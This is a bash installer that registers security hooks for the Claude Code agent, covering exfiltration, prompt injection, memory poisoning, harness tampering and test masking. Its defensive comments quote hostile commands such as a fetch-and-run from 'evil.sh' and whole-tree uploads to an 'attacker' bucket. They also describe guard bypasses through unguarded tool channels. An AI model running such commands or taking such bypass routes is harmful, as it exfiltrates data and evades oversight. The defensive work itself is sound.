#!/usr/bin/env bash
# Claude Supercharger — Hook Assembly & settings.json Merge

# Windows python defaults stdout to the ANSI codepage (cp1252) and raises
# UnicodeEncodeError on the box-drawing and arrow characters this script prints,
# losing ALL of its output. Hooks get this from hooks/lib-paths.sh; installer-side
# code never reaches that file, so it sets its own. `:=` honours an explicit setting.
: "${PYTHONIOENCODING:=utf-8}"
: "${PYTHONUTF8:=1}"
export PYTHONIOENCODING PYTHONUTF8

SUPERCHARGER_TAG="#supercharger"

get_hooks_for_mode() {
  local mode="$1"
  local has_developer="$2"
  local hooks_dir="$3"
  local hooks=()

  # Format: event|matcher|command|flags
  # matcher is empty for events that don't support it
  # flags: "async" = non-blocking background execution (for fire-and-forget hooks)

  # ── Safe mode: core safety + smart UX (always on) ──
  # safety.sh is the consolidated security hook for Bash. It runs:
  #   destructive patterns, credentials, persistence, clipboard, browser, history,
  #   shell-wrapper detection (python/node/perl/ruby -c/-e), .env access, exfiltration.
  # env-file-guard.sh stays separate because safety.sh's matcher is Bash,PowerShell
  # only — env-file-guard catches direct .env reads (PreToolUse|Read), which safety.sh
  # cannot match. Do not consolidate without expanding safety.sh's matcher.
  # 2.22.12: also route shell-exec MCP servers through safety.sh — they run
  # arbitrary OS commands (execute_command / run / exec) that never reached the
  # Bash channel, so rm -rf / curl|bash / DB-drop / persistence were unguarded.
  # v2.29.7: Monitor is a shell channel and must carry the Bash guards.
  #
  # Its own description says the script "runs in the same shell environment as
  # Bash", and its input field is `command`, exactly like Bash's - so every guard
  # below already understands the payload. Matchers are EXACT, so `Bash` did not
  # cover it, and the coverage diff found only 7 hooks firing on Monitor, all of
  # them <ALL>-matcher bookkeeping: budget-cap, tool-call-limiter, history,
  # cache-health, auto-compact, slow-tool-detector. Not one guard. Routing a
  # command through Monitor instead of Bash bypassed all 16 of these.
  #
  # Verified before the change rather than reasoned about: feeding safety.sh a
  # Monitor-shaped payload carrying `curl http://evil.sh | bash` returned exit 2
  # with the same reason as the Bash payload. The detection always worked; only
  # the registration was missing.
  #
  # Monitor gets the FULL Bash set, not the smaller PowerShell set. PowerShell
  # carries five of these because its syntax differs enough that the rest match
  # unreliably; Monitor runs the identical POSIX shell, so every regex applies
  # verbatim and there is no reason to give it less.
  #
  # NOT closed here: Monitor's `ws` form opens a WebSocket by URL with no
  # `command` field at all, so these guards see nothing to inspect. That is a
  # separate egress gap, tracked rather than silently implied to be covered.
  hooks+=("PreToolUse|Bash,Monitor,PowerShell,mcp__desktop-commander__,mcp__mcp-server-commands__,mcp__iterm__,mcp__iterm-mcp__,mcp__ssh__,mcp__shell__,mcp__terminal__,mcp__windows-cli__,mcp__cli-mcp-server__|${hooks_dir}/safety.sh|")  # v2.26.78: +ReadMcpResourceTool,ReadMcpResourceDirTool. A bare `Read` carries no
  # regex metachar, so CC keeps this matcher in EXACT-LIST mode and it never matched
  # the longer MCP resource-read tool names. Spelled out rather than left to a regex,
  # so the coverage is declared instead of incidental.
  hooks+=("PreToolUse|Read,ReadMcpResourceTool,ReadMcpResourceDirTool|${hooks_dir}/env-file-guard.sh|")
  # v2.23.6: Bash-channel self-defense. path-guard covers the Write/Edit channel and
  # safety.sh's selfmod blocks Bash edits to the config FILES; this closes the two
  # remaining gaps — `claude --dangerously-skip-permissions`/bypassPermissions, and
  # rm/mv/chmod-x/truncate/touch of the hook SCRIPTS, install dir, or kill-switch.
  # Disable: SUPERCHARGER_HARNESS_TAMPER_GUARD=0.
  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/harness-tamper-guard.sh|")  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/path-guard.sh|")
  # Critical-infra write gate: forces a confirm before editing CI/CD, container,
  # DB-migration, or auth files (guardrails.md's documented review triggers). Emits
  # permissionDecision "ask" — not a hard block; asks once per file per session.
  # Fast-path exits before sourcing libs on any non-critical path.
  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/critical-infra-guard.sh|")
  # Read-only mode (/sc-readonly): time-boxed "look, don't touch". Near-zero overhead
  # when off (fast-path exits before parsing). A PreToolUse deny → beats autopilot's
  # auto-approve automatically (tighten > loosen).
  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit,Bash,Monitor|${hooks_dir}/readonly-guard.sh|")  # v2.7.2: block memory-poisoning writes (OWASP ASI06). Persistent memory is
  # auto-loaded every SessionStart, so a poisoned write compromises all future
  # sessions — must be in safe mode, not just full.
  hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/memory-write-guard.sh|")
  hooks+=("PreToolUse|Bash,Monitor,WebFetch|${hooks_dir}/tool-preferences.sh|")  hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/code-security-scanner.sh|asyncRewake")
  # v2.23.5: a Jupyter cell shells out through the kernel (!cmd, %%bash, %pip,
  # os.system, subprocess) and never hits the Bash matcher — safety.sh never sees
  # it. Route the cell's shell content through safety.sh (parity, no drift) and ask
  # on package installs. Security floor → safe mode. Disable: SUPERCHARGER_NOTEBOOK_EXEC_GUARD=0.
  hooks+=("PreToolUse|NotebookEdit|${hooks_dir}/notebook-exec-guard.sh|")
  hooks+=("PermissionRequest||${hooks_dir}/smart-approve.sh|")
  hooks+=("PostToolUse|Bash,PowerShell,Write,Edit,NotebookEdit|${hooks_dir}/audit-trail.sh|async")
  hooks+=("PostToolUse|Bash|${hooks_dir}/trace-compactor.sh|async")
  hooks+=("PostToolUse|Bash|${hooks_dir}/bash-output-compactor.sh|")
  hooks+=("PostToolUse|mcp__|${hooks_dir}/mcp-output-truncator.sh|async")
  # v2.6.84: per-server MCP write gates. Real CVEs / incidents:
  # github write-gate → Invariant Labs May 2025 cross-repo exfil;
  # playwright guard → CVE-2025-9611 + GH #1495 / #1651;
  # sql guard → Supabase 2025 service-role injection.
  hooks+=("PreToolUse|mcp__github__|${hooks_dir}/mcp-github-write-gate.sh|")
  hooks+=("PreToolUse|mcp__playwright__,mcp__puppeteer__,mcp__browserbase__,mcp__browser-use__,mcp__browsermcp__,mcp__chrome-devtools__,mcp__stagehand__|${hooks_dir}/mcp-playwright-guard.sh|")
  hooks+=("PreToolUse|mcp__postgres__,mcp__supabase__,mcp__mysql__,mcp__sqlite__,mcp__neon__,mcp__mssql__,mcp__sqlserver__,mcp__mariadb__,mcp__bigquery__,mcp__snowflake__,mcp__clickhouse__,mcp__planetscale__,mcp__cockroach__,mcp__cockroachdb__,mcp__redshift__,mcp__oracle__,mcp__duckdb__,mcp__motherduck__,mcp__turso__,mcp__libsql__,mcp__timescale__,mcp__singlestore__|${hooks_dir}/mcp-sql-guard.sh|")
  # 2.22.14: destructive ops on infra/filesystem/git MCP servers (structured
  # tool calls that never hit the shell-channel guards) — ASK to confirm.
  hooks+=("PreToolUse|mcp__filesystem__,mcp__aws__,mcp__kubernetes__,mcp__k8s__,mcp__docker__,mcp__gcloud__,mcp__gcp__,mcp__azure__,mcp__git__,mcp__terraform__|${hooks_dir}/mcp-destructive-guard.sh|")
  # v2.23.7: Bash-channel parity for the above — the same destructive infra ops run
  # through the native CLI (aws/gcloud/az/kubectl/helm/gsutil/doctl/flyctl) where
  # safety.sh only guards cloud credential-theft/escape, not bulk deletes. ASK on
  # terminate/delete/uninstall/rm-r. Disable: SUPERCHARGER_CLOUD_CLI_GUARD=0.
  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/cloud-cli-destructive-guard.sh|")  # v2.23.19: whole-tree exfil that carries NO sensitive-name token — safety-detect's
  # upload arms are gated on _SENSITIVE_PATHS, so `tar czf - . | curl --data-binary @-`,
  # `aws s3 sync . s3://attacker`, `rsync -a . host:` slip through. ASK on the SHAPE
  # (archive-to-network-sink, or whole cwd/root/home sync to remote). Anchored so local
  # archives + build-dir deploys pass. /profile-gated. Disable: SUPERCHARGER_BULK_EXFIL_GUARD=0.
  hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/bulk-exfil-guard.sh|")  # v2.23.21: `git config`/`git -c` setting an EXEC-CAPABLE key (core.fsmonitor,
  # sshCommand, credential.helper, pager/editor, alias '!sh', filter clean/smudge,
  # diff/difftool/mergetool cmd, persistent hooksPath) → RCE on the next git op
  # (CVE-2026-55607 + credential-helper cluster). git-safety blocks only the inline
  # `-c core.hooksPath=` form. ASK (DENY fsmonitor + command-valued sshCommand);
  # value-shape gated so credential.helper=store/core.pager=less pass. /profile-gated.
  # Disable: SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0.
  hooks+=("PreToolUse|Bash,Monitor|${hooks_dir}/git-config-exec-guard.sh|")  # v2.23.24: code-injecting env var (LD_PRELOAD, DYLD_INSERT_LIBRARIES, BASH_ENV,
  # NODE_OPTIONS --require, PYTHONSTARTUP, GIT_SSH_COMMAND, PERL5OPT/RUBYOPT, …) →
  # exec on the NEXT process spawn, sidestepping command-pattern guards. safety.sh
  # doesn't cover the env-preload class. ASK, value-shape gated (NODE_OPTIONS=
  # --max-old-space-size / LD_LIBRARY_PATH=/usr/local/lib pass). /profile-gated.
  # Disable: SUPERCHARGER_ENV_EXEC_GUARD=0.
  hooks+=("PreToolUse|Bash,Monitor|${hooks_dir}/env-exec-guard.sh|")  # v2.7.49: block credential-harvesting Elicitation forms — an MCP server asking
  # for a password/token/api-key in a routine-looking form. Declines when the
  # schema has credential-style fields and the server isn't in
  # trustedElicitationServers (.supercharger.json). SYNC — must run to block.
  hooks+=("Elicitation|*|${hooks_dir}/elicitation-guard.sh|")
  # v2.6.83: include Read so file content (issue bodies, PRs, docs) is scanned
  # for injection markers — OWASP ASI01 + multiple real-world incidents where
  # the agent followed instructions embedded in a Read file (e.g. GitHub issue
  # title prompt-injecting `npm publish` with a stolen token).
  hooks+=("PostToolUse|mcp__,WebFetch,WebSearch,Read|${hooks_dir}/prompt-injection-scanner.sh|asyncRewake")
  # v2.23.11: the sibling above never sees Bash output, but agents pull untrusted
  # text through Bash (gh issue view, git log, raw curl, cat cloned README) far more
  # than through the gated WebFetch tool. Same override payloads, unscanned channel
  # (cross-channel-parity-drift). WARN-only; a cheap grep seed-gate keeps it off the
  # hot path (one grep, python only on a hit). Fail-open. Disable: SUPERCHARGER_BASH_INJECTION_SCANNER=0.
  hooks+=("PostToolUse|Bash|${hooks_dir}/bash-injection-scanner.sh|asyncRewake")
  # v2.7.2: structural provenance check on MCP results — forged tool-call/system
  # framing the prompt-injection-scanner's persuasion patterns don't cover (ASI04).
  hooks+=("PostToolUse|mcp__|${hooks_dir}/mcp-provenance.sh|asyncRewake")
  # WebFetch egress guard: the native WebFetch/WebSearch tool is a network-egress
  # channel with NO PreToolUse guard — an injection can steer it at cloud metadata
  # (169.254.169.254 → cred theft) or an internal IP (SSRF). safety.sh:288 covers
  # this on Bash and mcp-egress-guard on MCP; this is the un-mirrored WebFetch
  # sibling (cross-channel parity). Only fires on WebFetch/WebSearch → ~zero hot-path
  # cost. Fail-open. Disable: SUPERCHARGER_WEBFETCH_EGRESS=0.
  hooks+=("PreToolUse|WebFetch,WebSearch,Monitor|${hooks_dir}/webfetch-egress-guard.sh|")
  # v2.9.17: +mcp__ matcher — MCP tool RESPONSES were never secret-scanned (real
  # channel gap; a server can return a leaked credential). (from efij Stallion)
  # +WebFetch,WebSearch — fetched pages/results were never secret-scanned either.
  hooks+=("PostToolUse|Bash,Read,WebFetch,WebSearch,mcp__|${hooks_dir}/output-secrets-scanner.sh|asyncRewake")
  # v2.26.44: Artifact publishes a local file to a hosted URL — content leaving
  # the machine, irreversibly. None of the exfil guards matched it (they cover
  # Bash/MCP/WebFetch), and output-secrets-scanner is PostToolUse, i.e. after the
  # publish. PreToolUse so the check happens before anything is sent.
  hooks+=("PreToolUse|Artifact|${hooks_dir}/artifact-publish-guard.sh|")
  # Plugin-only first-run seeder: writes role/tier/mcp-profile scope files from
  # userConfig (CLAUDE_PLUGIN_OPTION_*) — the plugin equivalent of the installer
  # wizard. Runs first so later SessionStart hooks see the seeded files. No-ops
  # under the installer (CLAUDE_PLUGIN_ROOT unset); never clobbers an existing file.
  # v2.26.0: install.sh refuses without jq/python3, but a PLUGIN install has no
  # install step and nothing ever checked — 103 of 138 hooks use jq, 122 use
  # python3. Missing, the guards degrade silently. Warns once per missing-set,
  # on both channels (a classic install can lose a dependency later too).
  hooks+=("SessionStart||${hooks_dir}/dependency-preflight.sh|")
  hooks+=("SessionStart||${hooks_dir}/plugin-config-seed.sh|")
  # v2.26.0: writes the three settings.json keys a plugin cannot declare (statusLine,
  # env.ENABLE_PROMPT_CACHING_1H, attribution). A hook can do this because hooks are
  # not tool calls — no guard is involved and, unlike the toggle-the-kill-switch
  # approach, none is ever disabled. Opt-in via the `write_settings` userConfig, and a
  # no-op entirely under the installer runtime.
  hooks+=("SessionStart||${hooks_dir}/plugin-settings-seed.sh|")
  hooks+=("SessionStart||${hooks_dir}/config-scan.sh|")
  hooks+=("SessionStart||${hooks_dir}/standards-inject.sh|")
  # Plugin-only prompt-layer delivery: emits configs/universal/*.md as SessionStart
  # additionalContext when running under the plugin runtime (CLAUDE_PLUGIN_ROOT set).
  # No-ops under the installer, where the same content is persistent files.
  hooks+=("SessionStart||${hooks_dir}/prompt-layer-inject.sh|")
  hooks+=("Stop|*|${hooks_dir}/lesson-record.sh|async")
  # FIRST in the UserPromptSubmit chain on purpose: when /sc off has just run,
  # this states the override before any other hook injects anything, and it is
  # the ONE hook that must keep working while the kill-switch is set. See the
  # header of sc-toggle-notice.sh for why it does not source lib-suppress.
  hooks+=("UserPromptSubmit||${hooks_dir}/sc-toggle-notice.sh|")
  hooks+=("UserPromptSubmit||${hooks_dir}/lesson-recall.sh|")
  hooks+=("PostToolUse||${hooks_dir}/tool-history-tracker.sh|async")
  hooks+=("PreToolUse|Edit,Write,Bash,Monitor,MultiEdit,NotebookEdit|${hooks_dir}/confidence-gate.sh|")  hooks+=("PostToolUse||${hooks_dir}/cache-health.sh|async")

  # ── Full mode: everything ──
  if [[ "$mode" == "full" ]]; then
    # v2.9.4: advisory concurrent-session write guard — warns (never denies) when a
    # peer live session holds a fresh lease on the same file. Fail-open, TTL-expiring.
    hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/file-lease.sh|")
    # v2.9.6: opt-in first-touch investigation gate (default OFF via SUPERCHARGER_FACT_GATE).
    hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/fact-gate.sh|")
    # Lockfile integrity: ask before hand-editing a machine-generated dependency
    # lockfile (package-lock/yarn.lock/Cargo.lock/go.sum/…) — regenerate via the
    # package manager instead. Once per lockfile per session. Disable:
    # SUPERCHARGER_LOCKFILE_GUARD=0.
    hooks+=("PreToolUse|Write,Edit,MultiEdit,NotebookEdit|${hooks_dir}/lockfile-integrity-guard.sh|")
    # v2.23.9: supply-chain sibling of the lockfile guard — ASK when a manifest edit
    # adds/changes an install-time lifecycle script (package.json postinstall/prepare/…
    # or setup.py install-time exec), esp. one that reaches the network or evals code.
    # Runs on the next install → persistence vector. Disable: SUPERCHARGER_INSTALL_SCRIPT_GUARD=0.
    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/install-script-guard.sh|")
    # v2.23.25: `.pth` persistence — CPython exec's any `import`-prefixed line in a
    # .pth on interpreter startup (survives uninstall). DENY a .pth import line with
    # a shell/network primitive (os.system/subprocess/socket/urllib), ASK on softer
    # exec/eval/__import__. Bare-path + sys.path-finder .pth pass. install-script-guard
    # covers package.json/setup.py only. Disable: SUPERCHARGER_PTH_GUARD=0.
    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/pth-persistence-guard.sh|")
    # v2.23.14: supply-chain sibling — ASK when a manifest edit adds/changes a dep
    # from a NON-REGISTRY source (tarball/wheel URL, git+/github: shorthand, file:/
    # local path, or a registry-override index → dependency confusion). install-script
    # guards lifecycle scripts, lockfile guards the hash, dep-vuln audits known CVEs;
    # the dep ORIGIN was unguarded and runs before any CVE scan. Asks once per source
    # per session. Disable: SUPERCHARGER_PACKAGE_SOURCE_GUARD=0.
    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/package-source-guard.sh|")
    # v2.23.4: test-integrity guard — ASK before an edit to a test file removes
    # assertions or adds skip/only markers (it.skip, @pytest.mark.skip, @Ignore,
    # t.Skip, xit, .only, #[ignore]). Defends the Verification Gate against an
    # agent gaming the tests to go green. Disable: SUPERCHARGER_TEST_INTEGRITY_GUARD=0.
    hooks+=("PreToolUse|Edit,MultiEdit,Write|${hooks_dir}/test-integrity-guard.sh|")
    # v2.23.20: test-mask guard — the Bash-channel sibling of test-integrity-guard.
    # ASK when a verification runner's EXIT status is masked (`pytest || true`,
    # `npm test || echo ok`, `make test; exit 0`) so a failing check reports green.
    # test-integrity guards test-FILE edits; this guards the command exit-mask that
    # defeats the same Verification Gate. Disable: SUPERCHARGER_TEST_MASK_GUARD=0.
    hooks+=("PreToolUse|Bash,Monitor|${hooks_dir}/test-mask-guard.sh|")    # v2.23.27: editing a GENERATED file (dist/build/__generated__, *_pb2.py, *.pb.go,
    # *.min.js, or a @generated/DO NOT EDIT header) is wasted work — wiped on the next
    # codegen/build. ASK to redirect the edit to the source. Disable: SUPERCHARGER_GENERATED_FILE_GUARD=0.
    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/generated-file-guard.sh|")
    # v2.23.28: hallucinated LOCAL relative import (`./services/email` when the file
    # is mailer.ts) — WARN post-write, before it fails at compile/run. Only `./`+`../`
    # specs, only when NO candidate resolves. Disable: SUPERCHARGER_PHANTOM_IMPORT_GUARD=0.
    hooks+=("PostToolUse|Write,Edit,MultiEdit|${hooks_dir}/phantom-import-guard.sh|async")
    # v2.23.31: auto-RUN sibling editor config write (.vscode/tasks.json folderOpen,
    # .vscode|.cursor/mcp.json + .gemini/settings.json stdio server) — the .claude
    # hook-injection primitive ported to neighbours. ASK. Disable: SUPERCHARGER_EDITOR_CONFIG_GUARD=0.
    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/editor-config-guard.sh|")
    # v2.23.36: post-write advisory dispatcher — one process/one file-read for three
    # WARN checks (folded from conflict-marker/config-validity/shebang-exec guards to
    # cut the per-hook spawn floor): merge-conflict markers, unparseable json/yaml/toml,
    # and a shebang script left non-executable. Each check keeps its original kill-switch
    # (SUPERCHARGER_CONFLICT_MARKER_GUARD / _CONFIG_VALIDITY_GUARD / _SHEBANG_EXEC_GUARD);
    # master: SUPERCHARGER_POST_WRITE_ADVISOR=0.
    hooks+=("PostToolUse|Write,Edit,MultiEdit|${hooks_dir}/post-write-advisor.sh|async")
    # v2.23.34: raw ANSI content-hiding escape (ESC[8m conceal / ESC]8;; OSC-8) written
    # into a file — ASK. Hidden-instruction / output-spoof trap. Fixtures/docs skipped.
    # Disable: SUPERCHARGER_ANSI_ESCAPE_GUARD=0.
    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/ansi-escape-guard.sh|")
    # v2.23.41: GitHub Actions "pwn request" — a pull_request_target/workflow_run workflow
    # that checks out the untrusted PR head runs fork code with the repo's secrets. DENY
    # the allow-unsafe-pr-checkout:true opt-out, ASK the trigger+PR-head-checkout combo.
    # Disable: SUPERCHARGER_WORKFLOW_PWN_GUARD=0.
    hooks+=("PreToolUse|Write,Edit,MultiEdit|${hooks_dir}/workflow-pwn-guard.sh|")
    # v2.9.6: reactive MCP circuit-breaker — PostToolUse trips on 429/503/etc,
    # PreToolUse blocks calls to that server during cooldown. Default ON, fail-open.
    hooks+=("PreToolUse|mcp__|${hooks_dir}/mcp-circuit-breaker.sh|")
    hooks+=("PostToolUse|mcp__|${hooks_dir}/mcp-circuit-breaker.sh|async")
    # v2.9.17: classify URLs in MCP tool args — block metadata-SSRF / webhook /
    # paste-site egress, warn on private-network targets. (from efij Stallion)
    hooks+=("PreToolUse|mcp__|${hooks_dir}/mcp-egress-guard.sh|")
    hooks+=("Notification|idle_prompt|${hooks_dir}/notify.sh|async")
    hooks+=("Notification|auth_success|${hooks_dir}/notify.sh|async")
    hooks+=("Notification|elicitation_dialog|${hooks_dir}/notify.sh|async")
    hooks+=("Stop|*|${hooks_dir}/notify-stop.sh|async")
    hooks+=("PermissionRequest||${hooks_dir}/notify-permission.sh|async")
    # v2.26.85: the `if` field is REMOVED. Both guards were inert on every classic
    # install since 6fc897b -- measured live, not inferred: `git push --force
    # origin main` was NOT blocked, while the same installed hook invoked directly
    # returns rc=2.
    #
    # v2.26.86 correction: `if` is NOT broken. It takes PERMISSION RULE syntax --
    # "Bash(git *)", "Edit(*.ts)" -- and we passed a bare glob "git *", which
    # matches nothing. My own doing, and the same class as v2.24.5's bare `mcp__`
    # matcher: a filter in the wrong dialect matches nothing, fires nothing, and
    # errors nothing.
    #
    # Left REMOVED rather than corrected to "Bash(git *)". A mis-specified filter
    # cost two security guards for months, and the saving is two hook spawns per
    # Bash call. Anyone restoring it must verify on a LIVE session that the gated
    # hook actually fires -- reading the syntax off the docs is what produced the
    # original bug.
    hooks+=("PreToolUse|Bash,Monitor|${hooks_dir}/git-safety.sh")    # Git remote exfil guard: git-safety checks HOW you push; this checks WHERE —
    # asks before pushing the whole repo to a non-origin host or hijacking origin's
    # URL to a foreign host (whole-repo exfiltration). Ask (not deny) — forks/mirrors
    # are legit — once per host per session. Disable: SUPERCHARGER_GIT_REMOTE_GUARD=0.
    hooks+=("PreToolUse|Bash,Monitor|${hooks_dir}/git-remote-guard.sh")    # Redirect clobber guard: the Write/Edit review path is guarded, but a Bash
    # redirect (`echo x > app.ts`, `sed -i`, `tee`) overwrites tracked source and
    # bypasses ALL of it. Asks (not deny) ONLY when the target is git-tracked, once
    # per file per session. Fork-free fast-path; parser in redirect-clobber-detect.py.
    # Disable: SUPERCHARGER_REDIRECT_CLOBBER_GUARD=0.
    hooks+=("PreToolUse|Bash,Monitor|${hooks_dir}/redirect-clobber-guard.sh|")    # v2.14.3: consolidated commit guard — ONE hook runs three self-gating checks on
    # `git commit`: secret-in-staged-diff (default on), Co-Authored-By trailer (opt-in),
    # and Conventional Commit format (opt-in via .conventional-commits). Merged from
    # three separate hooks (commit-secret-guard/commit-coauthor-guard/commit-check) to
    # drop 2 process forks from EVERY Bash call. Each check keeps its own runtime flag,
    # so opt-in semantics are preserved on both channels — always registered, self-gating.
    hooks+=("PreToolUse|Bash,Monitor|${hooks_dir}/commit-guard.sh|")    hooks+=("PreToolUse|Bash,Monitor|${hooks_dir}/enforce-pkg-manager.sh|")    hooks+=("PostToolUse|Write,Edit|${hooks_dir}/scope-guard.sh check|async")
    hooks+=("PostToolUse|Edit,MultiEdit|${hooks_dir}/comment-replacement-check.sh|async")
    hooks+=("PostToolUse|Edit,MultiEdit|${hooks_dir}/lazy-refactor-check.sh|async")
    hooks+=("SessionStart||${hooks_dir}/project-config.sh|")
    hooks+=("SessionStart||${hooks_dir}/scope-guard.sh snapshot|async")
    hooks+=("SessionStart||${hooks_dir}/update-check.sh|async")
    # v2.29.3: Claude Code silently ignores a hook registered on an event it does
    # not know — no fire, no warning, no error (verified on 2.1.240 against a
    # deliberately bogus event name). 18 of the events below carry a version
    # floor, the highest being 2.1.219, so on an older build those hooks are
    # simply absent and nothing says so. Emits systemMessage and is BLOCKING, not
    # async: a hook's stderr arrives in the debug log as an unhandled bare line
    # while stdout JSON is parsed and shown, and the steady-state cost here is a
    # single stat, so there is nothing to gain by detaching it.
    hooks+=("SessionStart||${hooks_dir}/version-floor-check.sh|")
    hooks+=("SessionStart||${hooks_dir}/learn-from-blocks.sh|async")
    hooks+=("SessionStart||${hooks_dir}/session-memory-inject.sh|")
    hooks+=("PostToolUse||${hooks_dir}/auto-compact.sh|async")
    hooks+=("PostToolUse|mcp__|${hooks_dir}/mcp-tracker.sh|async")
    hooks+=("PostToolUse|Bash|${hooks_dir}/failure-tracker.sh|async")
    hooks+=("PostToolUse|Bash|${hooks_dir}/dep-vuln-scanner.sh|async")
    hooks+=("PostToolUse|Bash,Read|${hooks_dir}/repetition-detector.sh|")
    hooks+=("PreToolUse|Agent|${hooks_dir}/agent-gate.sh|")
    hooks+=("PreToolUse|Skill|${hooks_dir}/skill-poisoning-scanner.sh|")
    # v2.26.40: the same inspection for agent definitions. Skills had a load-time
    # scanner since v2.7.x; ~/.claude/agents/*.md had none, though it is the same
    # thing — instructions Claude follows, loaded by name, persistent on disk.
    hooks+=("PreToolUse|Agent|${hooks_dir}/agent-poisoning-scanner.sh|")
    # v2.26.76: Workflow runs a script that spawns subagents — the Agent channel's
    # capability without the Agent channel's three guards. Blocking, not async: it
    # must decide before the fan-out starts.
    hooks+=("PreToolUse|Workflow|${hooks_dir}/workflow-guard.sh|")
    # v2.26.77: SendMessage moves free text to other sessions and other MACHINES.
    # The tool's own description forbids using it to launder a blocked action past
    # the permission layer, but states it as an instruction with no mechanism.
    hooks+=("PreToolUse|SendMessage|${hooks_dir}/sendmessage-guard.sh|")
    # v2.26.78: +ScheduleWakeup. It is the same "make this run again later"
    # capability as Cron*, from the /loop dynamic-pacing path, and was unobserved.
    # The hook is schema-agnostic (it dumps tool_input verbatim), so this needs no
    # logic change — which is the point of having built it as pure observation.
    hooks+=("PreToolUse|CronCreate,CronDelete,CronList,ScheduleWakeup|${hooks_dir}/cron-discovery.sh|async")
    # v2.29.8: RemoteTrigger is the CLOUD sibling of the Cron* tools above, and
    # had nothing at all - a straight parity gap found by the same coverage-diff
    # sweep as the Monitor bypass. Unlike Cron*, its schema is fully documented,
    # so this is a real guard rather than another discovery log. Blocking, not
    # async: an ask cannot gate a tool call from a detached hook.
    hooks+=("PreToolUse|RemoteTrigger|${hooks_dir}/remote-trigger-guard.sh|")
    # v2.29.9: DesignSync write_files uploads local files by path - the tool
    # reads them from disk itself, so per its own description the "contents never
    # enter your context". Every other secret check we own runs on text that
    # passed through the session, so this hook is the only layer that can see
    # those bytes at all. Egress-family parity with artifact-publish-guard.
    hooks+=("PreToolUse|DesignSync|${hooks_dir}/designsync-upload-guard.sh|")
    # v2.7.27: do NOT register any hook on WorktreeCreate/WorktreeRemove. Despite
    # being in CC's valid-events list, WorktreeCreate is a PROVIDER hook, not an
    # observational one: CC delegates worktree creation to the registered hook and
    # requires it to return the new worktree path (stdout or
    # hookSpecificOutput.worktreePath). A passive/discovery hook returns nothing,
    # so CC fails the creation — registering here BREAKS `isolation: worktree` for
    # every agent (regression introduced and caught in v2.7.26). We can't observe
    # these events without taking over worktree creation, which is out of scope.
    # v2.7.2: runaway fan-out / recursion breaker (OWASP ASI08). Blocking gate,
    # so NOT async — must run before the spawn proceeds.
    hooks+=("SubagentStart||${hooks_dir}/subagent-circuit-breaker.sh|")
    hooks+=("SubagentStart|*|${hooks_dir}/subagent-discovery.sh|async")
    hooks+=("SubagentStop|*|${hooks_dir}/subagent-discovery.sh|async")
    # v2.7.25: MessageDisplay + UserPromptExpansion removed — current Claude Code
    # no longer lists them as valid hook events, so registering them triggered a
    # settings.json warning on every startup. The events existed in mid-2026 CC
    # builds but were dropped; their hooks are non-functional now. If CC
    # re-introduces an expansion/display event, restore from git history.
    hooks+=("Elicitation|*|${hooks_dir}/elicitation-discovery.sh|async")
    hooks+=("ElicitationResult|*|${hooks_dir}/elicitation-discovery.sh|async")
    hooks+=("CwdChanged|*|${hooks_dir}/cwd-changed.sh|")
    hooks+=("PermissionDenied||${hooks_dir}/permission-denied-advisor.sh|")
    hooks+=("PreCompact||${hooks_dir}/precompact-priorities.sh|")
    hooks+=("PostToolUse||${hooks_dir}/slow-tool-detector.sh|async")
    hooks+=("Stop|*|${hooks_dir}/stop-keep-going.sh|")
    hooks+=("SubagentStop|*|${hooks_dir}/subagent-stop-check.sh|")
    # v2.7.1: auto-recover subagent reports when the agent ignores the
    # report-pin instruction from subagent-safety.sh. async — pure scrape.
    hooks+=("SubagentStop|*|${hooks_dir}/subagent-report-fallback.sh|async")
    # v2.7.4: when the final message is a degraded stub (CC #54323), tell the
    # parent the report was recovered + how to read it. BLOCKING — async cannot
    # inject hookSpecificOutput into the parent's context.
    hooks+=("SubagentStop|*|${hooks_dir}/subagent-report-notify.sh|")
    hooks+=("PostToolUseFailure||${hooks_dir}/tool-failure-advisor.sh|")
    hooks+=("UserPromptSubmit||${hooks_dir}/agent-router.sh|")
    hooks+=("UserPromptSubmit||${hooks_dir}/context-advisor.sh|async")
    hooks+=("UserPromptSubmit||${hooks_dir}/adaptive-economy.sh|")
    hooks+=("UserPromptSubmit||${hooks_dir}/economy-reinforce.sh|")
    hooks+=("UserPromptSubmit||${hooks_dir}/scope-guard.sh contract|")
    # v2.26.37: async. This hook writes advisory nudges to stderr, always exits 0,
    # and never blocks or injects context — so nothing downstream depends on it
    # having finished. Synchronously it was 35ms of the ~131ms UserPromptSubmit
    # chain, i.e. the largest single contributor to the delay between the user
    # pressing enter and the model starting. Async keeps the notes and removes the
    # wait. Precedent on this exact event: context-advisor and learn-from-prompts.
    #
    # If this hook ever gains a block, an `exit 2`, or an additionalContext emit,
    # it MUST go back to synchronous — async output cannot gate a prompt.
    hooks+=("UserPromptSubmit||${hooks_dir}/prompt-validator.sh|async")
    hooks+=("UserPromptSubmit||${hooks_dir}/shell-escape-advisor.sh|")
    hooks+=("UserPromptSubmit||${hooks_dir}/destructive-prompt-scanner.sh|")
    # v2.10.9: block a pasted LIVE credential in the prompt before it reaches the
    # model + transcript. Shares lib-secret-patterns.sh. Override with
    # SUPERCHARGER_ALLOW_PROMPT_SECRETS=1. From dwarvesf/claude-guardrails.
    hooks+=("UserPromptSubmit||${hooks_dir}/prompt-secret-guard.sh|")
    hooks+=("Setup||${hooks_dir}/setup-check.sh|")
